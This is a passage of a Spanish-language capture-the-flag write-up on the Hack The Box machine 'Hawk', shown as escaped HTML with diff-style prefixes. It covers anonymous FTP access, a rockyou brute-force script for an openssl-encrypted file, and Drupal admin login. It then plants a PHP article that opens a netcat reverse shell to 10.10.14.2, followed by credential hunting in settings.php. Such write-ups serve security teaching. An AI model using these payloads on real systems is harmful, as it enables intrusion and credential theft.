class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\.\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\(\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\.\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\)\0\n\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;17.66 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a empezar con el análisis, primeramente por el puerto 21 asociado al servicio &lt;strong&gt;FTP&lt;/strong&gt;, por lo que intentamos conectarnos como el usuario &lt;em&gt;anonymous&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.102
-Connected to 10.10.10.102.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.102:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-230 Login successful.
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez conectados, vemos un directorio denominado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;messages&lt;/code&gt;, ingresamos a este y vemos que “no tiene contenido”; sin embargo, ocupamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; para listar posibles archivos ocultos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
-226 Directory send OK.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.drupal.txt.enc&lt;/code&gt;, por lo que lo traemos a nuestro equipo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get .drupal.txt.enc
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: .drupal.txt.enc remote: .drupal.txt.enc
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; .drupal.txt.enc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;240 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-226 Transfer complete.
-240 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.3659 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez en nuestro equipo, le echamos un ojo al contenido del archivo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;drupal.txt.enc
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: drupal.txt.enc
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
-   2   │ CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
-   3   │ QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
-   4   │ &lt;span class=&quot;nv&quot;&gt;t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se encuentra en &lt;strong&gt;base64&lt;/strong&gt;, por lo que lo decodificamos y lo guardamos a un archivo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;drupal.txt.enc | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; message.crypted
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;message.crypted
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: message.crypted   &amp;lt;BINARY&amp;gt;
-❯ file message.crypted
-message.crypted: openssl enc&lt;span class=&quot;s1&quot;&gt;'d data with salted password
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al tratar de visualizar nuestro archivos, vemos que la información se encuentra cifrada, por lo que procedemos a realizar un &lt;em&gt;script&lt;/em&gt; para descifrar el archivo a partir del direccionario &lt;strong&gt;rockyou.txt&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/wordlist/rockyou.txt&lt;/code&gt;) y la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt;. Para este caso, se buscó la frase &lt;em&gt;openssl enc’d data with salted password&lt;/em&gt; y se obtuvo como resultado el siguiente link, por lo que vamos a suponer el uso de `
-aes-256-cbc`:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://newbedev.com/how-to-use-openssl-to-encrypt-decrypt-files&quot;&gt;newbedev&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# Ctrl + c&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;ctrl_c&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 2 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Uso:&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;lt;message.encrypted&amp;gt; &amp;lt;message.decrypted&amp;gt;&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-&lt;span class=&quot;k&quot;&gt;fi
-
-while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;password&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
-	&lt;/span&gt;openssl aes-256-cbc &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; 2&amp;gt;/dev/null
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then
-		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] La contraseña es: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;
-		&lt;span class=&quot;nb&quot;&gt;break
-	&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
-done&lt;/span&gt; &amp;lt; /usr/share/wordlists/rockyou.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al darle permisos de ejecución al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x decrypter.sh&lt;/code&gt; y ejecutarlo, obtenemos el siguiente resultado:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ./decrypter.sh message.crypted message.decrypted
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; La contraseña es: friends
-Daniel,
-
-Following the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the portal:
-
-PencilKeyboardScanner123
-
-Please &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;us know when the portal is ready.
-
-Kind Regards,
-
-IT department
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En el mensaje observamos un mensaje para el usuario &lt;strong&gt;Daniel&lt;/strong&gt; en donde se le comparte la contraseña del portal; por lo tanto ingresamos a través del protocolo HTTP y utilizamos la credenciales &lt;em&gt;admin:PencilKeyboardScanner123&lt;/em&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;http://10.10.10.102/&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/hawk_panel.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/hawk_login.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez dentro del panel de administración de la tecnología &lt;strong&gt;Drupal 7&lt;/strong&gt;, accedemos al apartados de &lt;strong&gt;&lt;em&gt;Modules&lt;/em&gt;&lt;/strong&gt; en la parte superior y habilitamos la opción &lt;strong&gt;&lt;em&gt;PHP filter&lt;/em&gt;&lt;/strong&gt;. Por útlimo guardamos los cambios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/hawk_modules.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora le damos click al icono de &lt;em&gt;Home&lt;/em&gt; en la parte superior y seleccionamos al opción &lt;strong&gt;&lt;em&gt;Add new content&lt;/em&gt;&lt;/strong&gt;, seleccionamos &lt;strong&gt;&lt;em&gt;Article&lt;/em&gt;&lt;/strong&gt; y llenamos los siguientes campos:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Title: Reverse shell&lt;/li&gt;
-  &lt;li&gt;Tags: k4mishell&lt;/li&gt;
-  &lt;li&gt;Body:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-  system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.2 443 &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Text format: PHP code&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Nos ponemos en escucha a través del puerto 443 y guardamos los cambios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.2] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.102] 41610
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
-$ whoami
-www-data
-$ 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Realizamos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; y observamos que nos escontramos dentro de la máquina víctima como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;; ahora podemos visualizar la flag (user.txt). Para escalar privilegios, debemos tener en cuenta que se encuentra abierto el puerto 8082 asociado al servicio &lt;strong&gt;H2 Console&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/hawk_h2console.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Primeramente, validamos si el puerto 8082 está corriendo dentro de la máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-nat&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;8082
-tcp6       0      0 :::8082                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN     
-tcp6       0      0 10.10.10.102:8082       10.10.14.2:55896        ESTABLISHED
-www-data@hawk:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; probaremos si podemos visualizar contenido diferente que al que observamos vía web:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://localhost:8082
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
-Copyright 2004-2014 H2 Group. Multiple-Licensed under the MPL 2.0,
-and the EPL 1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://h2database.com/html/license.html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Initial Developer: H2 Group
-&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/html;charset=utf-8&quot;&lt;/span&gt; /&amp;gt;
-    &amp;lt;title&amp;gt;H2 Console&amp;lt;/title&amp;gt;
-    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet.css&quot;&lt;/span&gt; /&amp;gt;
-&amp;lt;script &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-location.href &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'login.jsp?jsessionid=a44a652e203c2092aa2e956117ab47a7'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&amp;lt;/script&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;margin: 20px;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-&amp;lt;h1&amp;gt;Welcome to H2&amp;lt;/h1&amp;gt;
-&amp;lt;h2&amp;gt;No Javascript&amp;lt;/h2&amp;gt;
-If you are not automatically redirected to the login page, &lt;span class=&quot;k&quot;&gt;then
-&lt;/span&gt;Javascript is currently disabled or your browser does not support Javascript.
-For this application to work, Javascript is essential.
-Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or use another web browser that supports it.
-
-&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
-www-data@hawk:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como podemos observar, el contenido es diferente, por lo que debemos estar pensando en hacer un &lt;em&gt;Remote/Local Port Forwarding&lt;/em&gt;. Para este caso utilizaremos un &lt;em&gt;Local Port Forwarding&lt;/em&gt; porque debido a unas políticas de la plataforma, no te permite realizar &lt;em&gt;Remote Port Forwarding&lt;/em&gt;. Podemos consultar información información en la siguiente liga:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/&quot;&gt;booleanworld&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Para realizar el &lt;em&gt;Local Port Forwarding&lt;/em&gt; necesitamos credenciales válidas de acceso por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, por lo que sabemos que un usuario potencia es &lt;strong&gt;daniel&lt;/strong&gt;, ahora tenemos que encontrar la contraseña de dicho usuario. Investigando un poco, encontramos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/sites/default/settings.php&lt;/code&gt; y se observan unas posibles credenciales de acceso&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/var/www/html/sites/default&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;settings.php | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username|password&quot;&lt;/span&gt;
